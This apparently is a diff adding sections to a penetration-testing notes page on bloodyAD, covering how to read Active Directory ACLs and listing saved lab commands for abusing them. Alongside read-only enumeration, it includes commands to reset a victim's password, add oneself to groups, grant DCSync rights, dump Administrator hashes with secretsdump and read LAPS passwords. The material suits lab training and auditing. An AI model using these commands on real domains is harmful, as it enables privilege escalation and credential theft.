@@ -9,6 +9,106 @@ hideFooterPagination: true
 
 {/* Generated from Commands/bloodyad.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
+## Trace a permission to a specific action
+
+An ACL path needs four facts: the principal you control, the object it can affect, the exact right, and the consequence of exercising that right. Resolve SIDs and nested membership before interpreting an ACE. A graph label or a readable security descriptor is not enough on its own.
+
+### Identify the principal and object
+
+```powershell
+whoami /user
+whoami /groups
+Get-ADUser USERNAME -Properties MemberOf,DistinguishedName,ObjectSID
+Get-ADGroup GROUP_NAME -Properties Members,DistinguishedName
+```
+
+The AD module must be available. A user's SID is more precise than a display name; retain the distinguished name so similarly named objects do not get confused.
+
+### Read the descriptor before changing anything
+
+```powershell
+# PowerView must already be loaded.
+Get-DomainObjectAcl -Identity TARGET_OBJECT -ResolveGUIDs
+Get-DomainGroupMember -Identity GROUP_NAME -Recurse
+
+# Native AD provider, when available:
+Get-Acl 'AD:\CN=Target,OU=Lab,DC=example,DC=local' | Format-List
+```
+
+```bash
+bloodyAD --host DC_FQDN -d DOMAIN_FQDN -u USERNAME -p 'PASSWORD' get writable
+bloodyAD --host DC_FQDN -d DOMAIN_FQDN -u USERNAME -p 'PASSWORD' get object TARGET_OBJECT
+```
+
+Inspect inheritance, object-specific GUIDs, allow/deny entries, and which principal receives the right. Preserve the original descriptor or relevant attribute values before a lab modification.
+
+### Interpret the right in the object's context
+
+| Right or relationship | Question to answer |
+| --- | --- |
+| WriteProperty / GenericWrite | Which attributes can actually be changed on this object type? |
+| Add member / WriteMembers | Can your identity add itself or another controlled principal to this group? |
+| ForceChangePassword | Is resetting this account permitted, and what access would that account gain? |
+| WriteDACL | Can you change the object's permission entries, and which right is needed next? |
+| WriteOwner | Can ownership be changed, and what further permission change would that enable? |
+| Replication extended rights | Do they apply to the domain naming context with the necessary combination? |
+
+Each row describes a different operation. Do not substitute one right for another because both appear in the same graph path.
+
+### Validate one edge and re-enumerate
+
+After an authorized lab change, query the same object again and compare its state. Confirm the new group membership or permission under the intended identity, then test only the next resource in the path. A membership change may require a new logon/token before a Windows process reflects it.
+
+```powershell
+Get-ADGroupMember GROUP_NAME
+Get-ADPrincipalGroupMembership USERNAME | Select-Object Name
+whoami /groups
+```
+
+If access still fails, check the exact target object, inherited scope, current token, authentication mechanism, and service-specific authorization. Restore the recorded original state when the exercise calls for cleanup. Use the existing worked ACL examples below for the specific modification syntax once this permission chain is established.
+
+## bloodyAD: choose the operation and read the result
+
+Query AD objects and permissions, then use the matching saved ACL procedure.
+
+### What the result establishes
+
+Read the exact object, attribute or membership result and identify the right your principal holds.
+
+### Prerequisites and common failures
+
+Read operations and modifying operations have different consequences; a writable attribute does not imply arbitrary control over the entire domain.
+
+Domain credentials and LDAP connectivity to the DC. For Kerberos, use the options supported by your installed version.
+
+### Example 1: Read an object
+
+Run in: **Kali**.
+
+```bash
+bloodyAD --host DC_FQDN -d DOMAIN_FQDN -u USER -p 'PASSWORD' get object TARGET_OBJECT
+```
+
+### Example 2: Find writable objects
+
+Run in: **Kali**. A writable attribute or object is a specific permission, not automatic domain administrator access.
+
+```bash
+bloodyAD --host DC_FQDN -d DOMAIN_FQDN -u USER -p 'PASSWORD' get writable
+```
+
+### Example 3: Inspect memberships
+
+Run in: **Kali**.
+
+```bash
+bloodyAD --host DC_FQDN -d DOMAIN_FQDN -u USER -p 'PASSWORD' get membership USER
+```
+
+## Saved commands and notebook recipes
+
+Query AD objects and permissions, then use the matching saved ACL procedure.
+
 Replace UPPER_CASE values with your lab values.
 
 [Search this tool’s saved examples](/commands/notebook?tool=bloodyad) · [All tools](/index)
@@ -23,6 +123,13 @@ Replace UPPER_CASE values with your lab values.
 bloodyAD --host DC_FQDN -d DOMAIN_FQDN -u USER -p 'PASSWORD' get object TARGET_OBJECT
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [AD ACL Abuse: Quick Reference — Example 1: Read an object](/active-directory/acl-abuse#example-1-read-an-object) · [PowerView — Load and Enumerate — Example 1: Read an object](/tools/powerview#example-1-read-an-object)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 ## Find writable objects
 
 **Kali**
@@ -30,6 +137,13 @@ bloodyAD --host DC_FQDN -d DOMAIN_FQDN -u USER -p 'PASSWORD' get object TARGET_O
 ```bash
 bloodyAD --host DC_FQDN -d DOMAIN_FQDN -u USER -p 'PASSWORD' get writable
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [AD ACL Abuse: Quick Reference — Example 2: Find writable objects](/active-directory/acl-abuse#example-2-find-writable-objects) · [PowerView — Load and Enumerate — Example 2: Find writable objects](/tools/powerview#example-2-find-writable-objects)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 A writable attribute or object is a specific permission, not automatic domain administrator access.
 
@@ -40,6 +154,13 @@ A writable attribute or object is a specific permission, not automatic domain ad
 ```bash
 bloodyAD --host DC_FQDN -d DOMAIN_FQDN -u USER -p 'PASSWORD' get membership USER
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [AD ACL Abuse: Quick Reference — Example 3: Inspect memberships](/active-directory/acl-abuse#example-3-inspect-memberships) · [PowerView — Load and Enumerate — Example 3: Inspect memberships](/tools/powerview#example-3-inspect-memberships)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 [Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
 
@@ -60,6 +181,13 @@ bloodyAD --host DC_FQDN -d DOMAIN_FQDN -u USER -p 'PASSWORD' get membership USER
 bloodyAD -u USER -p PASS -d $DOMAIN --host $DC set password victim 'NewPass123!'
 bloodyAD -u USER -p PASS -d $DOMAIN --host $DC add groupMember 'Helpdesk' me
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [AD ACL Abuse: Quick Reference — Existing notes and worked examples](/active-directory/acl-abuse#existing-notes-and-worked-examples)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -88,6 +216,13 @@ proxychains bloodhound-python -u bdavid -p '...' -d nexura.htb -ns 172.16.119.11
 proxychains bloodyAD --host 172.16.119.11 -d nexura.htb -u bdavid -p '...' get writable
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Active Directory Attack Path: Worked Lab — 6. Internal AD enumeration](/cheatsheets/ad-attack-path-worked-example#6-internal-ad-enumeration)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Group → DCSync chain (what we&#x27;d have done with bdavid if those edges were outbound)">
@@ -105,6 +240,13 @@ proxychains bloodyAD --host <DC> -d <domain> -u <you> -p '<pass>' add dcsync <yo
 proxychains impacket-secretsdump '<domain>/<you>:<pass>'@<DC> -just-dc-user Administrator
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [BloodHound: Full Reference — Group → DCSync chain (what we'd have done with bdavid if those edges were outbound)](/cheatsheets/bloodhound-complete-guide#group-→-dcsync-chain-what-we-d-have-done-with-bdavid-if-those-edges-were-outbound)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="No‑GUI shortcut: bloodyAD">
@@ -119,6 +261,13 @@ proxychains bloodyAD --host <DC> -d <domain> -u <user> -p '<pass>' get writable 
 proxychains bloodyAD --host <DC> -d <domain> -u <user> -p '<pass>' get object <target> --attr memberOf
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [BloodHound: Full Reference — No‑GUI shortcut: bloodyAD](/cheatsheets/bloodhound-complete-guide#no‑gui-shortcut-bloodyad)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="The three reusable &quot;I control a user&quot; primitives">
@@ -131,6 +280,13 @@ proxychains bloodyAD --host <DC> -d <domain> -u <user> -p '<pass>' get object <t
 proxychains bloodyAD --host <DC> -d <domain> -u <you> -p '<pass>' set password <target> 'Newpass123!'
 # or:  net rpc password <target> 'Newpass123!' -U '<domain>/<you>%<pass>' -S <DC>
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [BloodHound: Full Reference — The three reusable "I control a user" primitives](/cheatsheets/bloodhound-complete-guide#the-three-reusable-i-control-a-user-primitives)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -146,6 +302,13 @@ Context from the notebook: Most commands here were run during the actual engagem
 bloodyAD add dsync
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Active Directory Attack Path: Worked Lab — Active Directory Attack Path: Worked Lab](/cheatsheets/ad-attack-path-worked-example)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="ACL / object‑control edges (the escalation bread‑and‑butter)">
@@ -160,6 +323,13 @@ Context from the notebook: GenericAll  (on group) Add members bloodyAD ... add g
 bloodyAD ... add groupMember "<group>" <youruser>
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [BloodHound: Full Reference — ACL / object‑control edges (the escalation bread‑and‑butter)](/cheatsheets/bloodhound-complete-guide#acl-/-object‑control-edges-the-escalation-bread‑and‑butter)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **BloodHound: Full Reference**
 
 Context from the notebook: WriteDacl Rewrite the object's DACL grant yourself GenericAll/DCSync:  dacledit / bloodyAD add genericAll
@@ -167,6 +337,13 @@ Context from the notebook: WriteDacl Rewrite the object's DACL grant yourself Ge
 ```text
 bloodyAD add genericAll
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [BloodHound: Full Reference — ACL / object‑control edges (the escalation bread‑and‑butter)](/cheatsheets/bloodhound-complete-guide#acl-/-object‑control-edges-the-escalation-bread‑and‑butter)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 **BloodHound: Full Reference**
 
@@ -176,6 +353,13 @@ Context from the notebook: ForceChangePassword Reset their password (no old pw) 
 bloodyAD ... set password <target> 'NewPass123!'
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [BloodHound: Full Reference — ACL / object‑control edges (the escalation bread‑and‑butter)](/cheatsheets/bloodhound-complete-guide#acl-/-object‑control-edges-the-escalation-bread‑and‑butter)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **BloodHound: Full Reference**
 
 Context from the notebook: ReadLAPSPassword Read the local admin pw (LAPS) nxc ldap &lt;DC> -u u -p p -M laps  /  bloodyAD get object &lt;comp> --attr ms-Mcs-AdmPwd
@@ -183,6 +367,13 @@ Context from the notebook: ReadLAPSPassword Read the local admin pw (LAPS) nxc l
 ```text
 bloodyAD get object <comp> --attr ms-Mcs-AdmPwd
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [BloodHound: Full Reference — ACL / object‑control edges (the escalation bread‑and‑butter)](/cheatsheets/bloodhound-complete-guide#acl-/-object‑control-edges-the-escalation-bread‑and‑butter)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -198,6 +389,13 @@ Context from the notebook: Skip the GUI, just check ACLs fast bloodyAD get writa
 bloodyAD get writable
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [BloodHound: Full Reference — ⏱️ DECISION HEADER](/cheatsheets/bloodhound-complete-guide#-decision-header) · [BloodHound: Full Reference — 🧠 BloodHound mindset](/cheatsheets/bloodhound-complete-guide#-bloodhound-mindset)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 </AccordionGroup>
@@ -205,3 +403,13 @@ bloodyAD get writable
 ## Related tools and references
 
 - [bloodyAD user guide](https://github.com/CravateRouge/bloodyAD/wiki/User-Guide)
+
+{/* VAULT_RELATED_START */}
+
+**Source material and related references**
+
+- [AD ACL Abuse: Quick Reference](/active-directory/acl-abuse)
+- [Service accounts and gMSA](/field/service-accounts)
+- [AD groups and effective access](/field/ad-groups)
+
+{/* VAULT_RELATED_END */}
